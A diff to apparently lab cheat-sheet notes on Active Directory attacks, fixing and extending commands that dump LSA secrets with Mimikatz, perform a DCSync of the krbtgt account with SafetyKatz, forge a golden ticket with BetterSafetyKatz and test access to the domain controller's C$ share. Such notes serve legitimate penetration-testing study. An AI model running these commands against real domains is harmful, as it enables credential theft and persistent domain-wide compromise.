@@ -16,14 +16,16 @@ Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc
 
 # DCSync to get AES keys
 # Needs Domain admin or Replication Rights
-C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync/user:dcorp\krbtgt" "exit"
+C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
 ```
 
 ## Create The Ticket
 
 {% code overflow="wrap" %}
 ```powershell
-C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:<domain> /sid:<sid> /aes256:<aes_key> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
+C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:<domain> /sid:<user_sid> /aes256:<aes_key> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
+
+dir \\dcorp-dc\c$ # check if worked
 ```
 {% endcode %}
 
